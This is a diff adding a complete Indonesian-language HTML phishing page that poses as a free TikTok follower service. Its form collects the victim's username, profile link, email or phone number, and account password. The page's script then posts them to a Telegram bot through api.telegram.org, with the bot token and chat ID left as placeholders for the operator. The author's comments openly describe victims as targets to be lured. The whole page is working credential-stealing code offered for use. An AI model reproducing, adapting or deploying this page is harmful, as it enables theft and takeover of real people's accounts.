@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Followers TikTok</title>
+</head>
+
+<body>
+
+    <!-- Created By Lezz DcodeR
+
+    Kenapa Ga Pake CSS Bg? Kan Jadi Kece, Kaya Buat Animasi Ganti Warna.
+    Biar Target Lebih Tertarik. Gw Ga Bisa CSS Anj.
+    Sebenernya Bisa Sih, Tapi Ntar Lama. Gini Juga Udah Kece 🗿🚬 -->
+
+    <h1 style="text-align: center; color: red;">HARAP ISI DATA INI DENGAN BENAR!!!</h1>
+
+    <form id="anu" style="text-align: center;">
+        <input type="text" id="anunyamark" placeholder="Username TikTok" required><br><br>
+        <input type="url" id="silityou" placeholder="Link TikTok" required><br><br>
+        <input type="number" id="sikontoltertipu" placeholder="Jumlah Follower" required><br><br>
+        <input type="text" id="rusdi" placeholder="Email/Nomor Telepon" required><br><br>
+        <input type="text" id="andre" placeholder="Password" required><br><br>
+        <button type="submit">Kirim</button>
+    </form>
+
+    <script>
+        document.getElementById("anu").addEventListener("submit", function(e) {
+            e.preventDefault()
+        
+            let anunyamark = document.getElementById("anunyamark").value.trim()
+            let silityou = document.getElementById("silityou").value.trim()
+            let sikontoltertipu = document.getElementById("sikontoltertipu").value.trim()
+            let rusdi = document.getElementById("rusdi").value.trim()
+            let andre = document.getElementById("andre").value.trim()
+        
+            if (!anunyamark || !silityou || !sikontoltertipu || !rusdi || !andre) {
+                alert("Isi Data Dengan Benar Agar Kami Dapat Memproses Permintaan Anda!")
+                return
+            }
+        
+            let botToken = "TOKEN BOT LU SUKI"
+            let chatId = "ID TELE LU SUKI"
+            let jomok = `🚀 *Data Akun TikTok* 🚀\n\n👤 Username: ${anunyamark}\n🔗 Link: ${silityou}\n👥 Jumlah Follower Yang Diminta: ${sikontoltertipu}\n📧 Email/No HP: ${rusdi}\n🔑 Password: ${andre}`
+        
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: jomok, parse_mode: "Markdown" })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.ok) {
+                    alert("Permintaan berhasil dikirim! Tunggu beberapa saat agar permintaan diproses.")
+                    document.getElementById("anu").reset()
+                } else {
+                    alert("Gagal mengirim data!")
+                }
+            })
+            .catch(() => alert("Terjadi kesalahan! Coba beberapa saat lagi"))
+        })
+    </script>
+
+</body>
+
+</html>
